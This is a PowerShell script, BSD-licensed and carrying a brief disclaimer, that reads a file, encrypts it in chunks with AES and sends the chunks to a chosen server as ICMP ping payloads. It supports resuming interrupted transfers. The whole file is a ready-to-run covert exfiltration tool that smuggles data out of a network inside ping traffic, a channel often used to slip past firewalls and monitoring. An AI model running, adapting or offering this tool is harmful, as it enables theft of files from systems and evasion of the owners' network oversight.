<#
BSD 3-Clause License

Copyright (c) 2024, rob
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
  list of conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.

* Neither the name of the copyright holder nor the names of its
  contributors may be used to endorse or promote products derived from
  this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


This script is not to be used in the commission of a crime, thanks.
#>

param(
	[Parameter(Mandatory = $true)]
	[Alias("f")]
	[String]$infilename,

	[Parameter(Mandatory = $true)]
	[Alias("h")]
	[String]$serverhost,

	[Alias("r")]
	[System.Collections.Generic.List[int]]$resumeChunks,

	[Alias("k")]
	[Parameter(Mandatory = $true)]
	[ValidatePattern('^[0-9A-Fa-f]{32}$')]
	[String]$key = $null,

	[Alias("c")]
	[int]$chunksize = 1423,

	[Alias("s")]
	[String]$sleep = 1,

	[Alias("x")]
	[ValidateLength(4,4)]
	[Parameter(Mandatory = $true)]
	[String]$xferId
)

function ConvertHexStringToByteArray {
    param (
        [Parameter(Mandatory=$true)]
        [ValidatePattern('^[0-9A-Fa-f]{32}$')]
        [string]$HexString
    )

    $ByteArray = New-Object byte[] ($HexString.Length / 2)
    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
        $ByteArray[$i/2] = [System.Convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    return $ByteArray
}

[console]::TreatControlCAsInput = $true
$ErrorActionPreference = "Stop"

# open input file to read
$infile = Resolve-Path -Path $infilename
$filestream = New-Object IO.FileStream($infile, [IO.FileMode]::Open, [IO.FileAccess]::Read)

# normalise chunksize
switch ($chunksize) {
	{ $_ -lt 16 } { 
		[int]$bufSize = 15
		$outstring = "Warning: using minimum chunksize of 15 bytes, this results in a 64 byte ping payload and" 
	}
	{ $_ -gt 32719 } { 
		[int]$bufSize = 32719
		$outstring = "Warning: using maximum chunksize of 32719 bytes for" 
	}
	default { 
		[int]$bufSize = $chunksize; 
		$outstring = "Using chunksize of $chunksize bytes for" 
	}
}

[int]$totalChunks = [math]::ceiling($filestream.Length / $bufSize)
$outstring = $outstring + " a total of $totalChunks file chunks"
Write-Output $outstring

if ($chunksize -gt 1423) {
	Write-Output "Warning: chunksizes over 1423 bytes could cause max MTU issues."
}

[int]$chunkId = 0
[int]$lastSentChunkId = 0
$payload = [byte[]]::new($bufSize)

$bxferId = [byte[]]::new(2)
$bxferId[0] = [Convert]::ToByte($xferId.Substring(0, 2), 16)
$bxferId[1] = [Convert]::ToByte($xferId.Substring(2, 2), 16)

Write-Output "XferId is $xferId, sending to $serverhost, data will be read from $infile"

# prep for resume or full transfer
$chunksToSend = new-object bool[] $totalChunks
if ($resumeChunks) {
	$resumeChunks.Add($totalChunks)
	for ($i = 0; $i -lt ($resumeChunks.count); $i++) {
		$chunksToSend[($resumeChunks[$i] - 1)] = $true
	}
	Write-Output "Resuming transfer, sending $($resumeChunks.Count) chunks..."
}
else {
	for ($i = 0; $i -lt ($chunksToSend.Length); $i++) {
		$chunksToSend[$i] = $true
	}
	Write-Output "Sending all $totalChunks file chunks..."
}

$rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
$iv = New-Object Byte[](16)
$keyBytes = ConvertHexStringToByteArray($key)
$pingoptions = New-Object System.Net.NetworkInformation.PingOptions

# do the sending
while ($bytesRead = $filestream.Read($payload, 0, $bufSize)) {
	$chunkId++
	if ( $chunksToSend[$chunkId - 1] -eq $false ) {
		continue
	}

	$packet = $bxferId
	$packet += [System.BitConverter]::GetBytes($bufSize)
	$packet += [System.BitConverter]::GetBytes($chunkId)
	$packet += [System.BitConverter]::GetBytes($totalChunks)
	
	$instream = new-object System.IO.MemoryStream(, ($payload[0..($bytesRead - 1)]))
	$outstream = New-Object IO.MemoryStream

	$rng.GetBytes($iv)
	$outstream.Write($iv, 0, $iv.Length)

	$aes = New-Object System.Security.Cryptography.AesManaged
	$encryptor = $aes.CreateEncryptor($keyBytes, $iv)
	
	$cryptstream = New-Object System.Security.Cryptography.CryptoStream($outstream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
	$instream.CopyTo($cryptstream)
	$cryptstream.Dispose()

	$enc = $outstream.ToArray()

	$packet += [System.BitConverter]::GetBytes(([System.Convert]::ToUint16($enc.Length)))
	$packet += $enc

	$icmpclient = New-Object System.Net.NetworkInformation.Ping # new client for each packet, otherwise run into timeout issues when no response recieved
	$icmpclient.SendAsync($serverhost, 1, $packet, $pingoptions)
	
	$lastSentChunkId = $chunkId
	Start-Sleep -Milliseconds $sleep
	
	if ($chunkId % 10 -eq 0) { 
		Write-Output "Sent $chunkId / $totalChunks chunks"
	}

	# detect ctrl + c
	while ($Host.UI.RawUI.KeyAvailable -and ($readkey = $Host.UI.RawUI.ReadKey("AllowCtrlC,NoEcho,IncludeKeyUp"))) {
		if ([Int]$readkey.Character -eq 3) {
			Write-Output "Ctrl+c pressed during transfer, exiting"
			Exit
		}
		$Host.UI.RawUI.FlushInputBuffer()
	}
}
Write-Output("Sending complete")